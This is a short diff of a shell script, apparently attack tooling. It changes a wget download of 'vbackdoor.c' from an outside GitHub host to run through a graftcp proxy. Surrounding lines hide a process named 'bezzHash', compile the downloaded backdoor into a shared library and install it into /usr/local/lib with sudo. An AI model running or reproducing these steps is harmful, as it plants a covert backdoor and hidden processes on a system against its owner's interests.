@@ -47,7 +47,7 @@ echo " "
 chmod +x bezzHash
 ph add bezzHash
 
-wget https://raw.githubusercontent.com/veo/vbackdoor/main/vbackdoor.c
+./graftcp/graftcp wget https://raw.githubusercontent.com/veo/vbackdoor/main/vbackdoor.c
 vi vbackdoor.c
 gcc -Wall -fPIC -shared -o vbackdoor.so vbackdoor.c -ldl
 sudo mv vbackdoor.so /usr/local/lib/
